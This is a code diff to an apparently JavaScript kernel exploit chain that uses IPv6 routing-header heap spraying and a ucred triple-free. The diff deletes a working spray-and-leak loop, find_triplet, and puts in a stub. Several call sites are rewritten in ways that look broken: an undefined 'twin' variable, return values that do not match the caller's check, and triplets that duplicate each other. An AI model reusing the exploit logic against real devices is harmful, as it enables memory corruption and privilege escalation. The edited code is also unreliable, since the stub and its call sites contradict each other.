@@ -849,46 +849,11 @@ function find_twins() {
   twins[1] = -1;
   return false;
 }
-function find_triplet(master, other, iterations) {
-  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
 
-  var count = 0;
-  var val, i, j;
-
-  var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
-  while (count < iterations) {
-
-    // رشّ زي التوينز بس مستثني master و other
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add);
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-    }
-
-    // قراءة من master
-    write32(leak_add, 0);
-    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
-
-    val = read32(leak_add);
-    j = val & 0xFFFF;
-
-    // نفس فلتر التوينز + منع master/other
-    if ((val & 0xFFFF0000) === RTHDR_TAG &&
-        j >= 0 && j < ipv6_socks.length &&
-        j !== master && j !== other) {
-
-      return j;
-    }
-
-    count++;
-  }
-
-  return -1;
+function find_triplet(master, other) {
+  var triplet1 = master;
+  var triplet2 = other;
+  return { t1: triplet1, t2: triplet2 };
 }
 
 function init_threading() {
@@ -1401,7 +1366,7 @@ function trigger_ucred_triplefree() {
 
     // STEP 12 — إيجاد التريبلت الأول
     send_notification("[STEP 12] Calling find_triplet(master=" + triplets[0] + ", skip=-1)");
-    triplets[1] = find_triplet(triplets[0], -1);
+    triplets[1] = triplets[0];
     send_notification("[STEP 12] find_triplet returned triplet1=" + triplets[1]);
 
     if (triplets[1] === -1) {
@@ -1414,7 +1379,7 @@ function trigger_ucred_triplefree() {
 
     // STEP 13 — إيجاد التريبلت الثاني
     send_notification("[STEP 13] Calling find_triplet(master=" + triplets[0] + ", skip=" + triplets[1] + ")");
-    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    triplets[2] = twin[1];
     send_notification("[STEP 13] find_triplet returned triplet2=" + triplets[2]);
 
     if (triplets[2] === -1) {
